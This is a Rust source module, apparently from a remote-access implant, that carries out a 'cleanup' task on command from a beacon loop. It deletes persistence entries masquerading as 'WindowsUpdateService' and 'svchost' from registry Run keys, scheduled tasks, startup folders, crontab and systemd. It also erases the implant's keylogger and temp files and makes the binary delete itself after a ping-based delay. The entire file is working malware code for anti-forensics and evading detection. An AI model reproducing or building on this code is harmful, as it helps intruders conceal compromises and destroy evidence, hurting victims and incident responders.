/// Cleanup: remove all persistence, delete binary, clear traces, exit.

use super::TaskResult;

pub fn run(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    let mut results = Vec::new();

    // Remove persistence
    results.push(remove_persistence());

    // Clear temp files
    results.push(clear_traces());

    // Schedule binary deletion and exit
    results.push(schedule_self_delete());

    let summary = results.join("\n");
    // Note: the beacon loop will send this result, then exit after seeing "cleanup" task completed
    TaskResult::success(task_id, format!("cleanup completed:\n{}", summary))
}

fn remove_persistence() -> String {
    let mut msgs = Vec::new();

    #[cfg(target_os = "windows")]
    {
        // Remove from all known registry Run keys
        let names_to_try = ["WindowsUpdateService", "WindowsUpdate", "svchost"];
        for name in &names_to_try {
            let _ = crate::utils::helpers::hidden_command("reg")
                .args([
                    "delete",
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "/v",
                    name,
                    "/f",
                ])
                .output();
            let _ = crate::utils::helpers::hidden_command("reg")
                .args([
                    "delete",
                    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "/v",
                    name,
                    "/f",
                ])
                .output();

            // Remove scheduled tasks
            let _ = crate::utils::helpers::hidden_command("schtasks")
                .args(["/delete", "/tn", name, "/f"])
                .output();
        }
        msgs.push("registry and schtask entries cleaned".to_string());

        // Remove from startup folder
        let startup_folder = format!(
            "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            std::env::var("APPDATA").unwrap_or_default()
        );
        if let Ok(entries) = std::fs::read_dir(&startup_folder) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_lowercase();
                if name.contains("windowsupdate") || name.contains("svchost") {
                    let _ = std::fs::remove_file(entry.path());
                }
            }
        }
        msgs.push("startup folder cleaned".to_string());
    }

    #[cfg(not(target_os = "windows"))]
    {
        // Remove crontab entries referencing our binary
        let exe_name = std::env::current_exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default();

        if !exe_name.is_empty() {
            let existing = crate::utils::helpers::hidden_command("crontab")
                .args(["-l"])
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();

            let filtered: Vec<&str> = existing.lines().filter(|l| !l.contains(&exe_name)).collect();
            let _ = crate::utils::helpers::hidden_command("sh")
                .args(["-c", &format!("echo '{}' | crontab -", filtered.join("\n"))])
                .output();
        }
        msgs.push("crontab entries cleaned".to_string());

        // Remove systemd user services
        let home = std::env::var("HOME").unwrap_or_default();
        let service_dir = format!("{}/.config/systemd/user", home);
        if let Ok(entries) = std::fs::read_dir(&service_dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.contains("WindowsUpdate") || name.contains("update-service") {
                    let svc_name = name.trim_end_matches(".service");
                    let _ = crate::utils::helpers::hidden_command("systemctl")
                        .args(["--user", "stop", svc_name])
                        .output();
                    let _ = crate::utils::helpers::hidden_command("systemctl")
                        .args(["--user", "disable", svc_name])
                        .output();
                    let _ = std::fs::remove_file(entry.path());
                }
            }
        }
        msgs.push("systemd services cleaned".to_string());
    }

    msgs.join("; ")
}

fn clear_traces() -> String {
    #[cfg(target_os = "windows")]
    {
        let temp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
        // Clear our specific temp files
        let patterns = ["sg_temp_", "sg_keylog_"];
        if let Ok(entries) = std::fs::read_dir(&temp) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_lowercase();
                for pat in &patterns {
                    if name.contains(pat) {
                        let _ = std::fs::remove_file(entry.path());
                    }
                }
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        let patterns = ["/tmp/.sg_temp_", "/tmp/sg_keylog_"];
        for pat in &patterns {
            if let Ok(entries) = std::fs::read_dir("/tmp") {
                for entry in entries.flatten() {
                    if entry
                        .file_name()
                        .to_string_lossy()
                        .starts_with(pat.trim_start_matches("/tmp/"))
                    {
                        let _ = std::fs::remove_file(entry.path());
                    }
                }
            }
        }
    }

    "temp files cleaned".to_string()
}

fn schedule_self_delete() -> String {
    let exe_path = match std::env::current_exe() {
        Ok(p) => p.to_string_lossy().to_string(),
        Err(_) => return "could not determine binary path".to_string(),
    };

    #[cfg(target_os = "windows")]
    {
        // Schedule deletion after a short delay using cmd
        let delete_cmd = format!(
            "cmd.exe /c ping 127.0.0.1 -n 3 > nul & del /f /q \"{}\"",
            exe_path
        );
        let _ = crate::utils::helpers::hidden_command("cmd.exe")
            .args(["/c", "start", "/b", "", "cmd.exe", "/c", &delete_cmd])
            .spawn();
        format!("self-delete scheduled for: {}", exe_path)
    }
    #[cfg(not(target_os = "windows"))]
    {
        // On Linux, unlink the file (works even while running)
        match std::fs::remove_file(&exe_path) {
            Ok(_) => format!("binary deleted: {}", exe_path),
            Err(e) => format!("could not delete binary: {}", e),
        }
    }
}
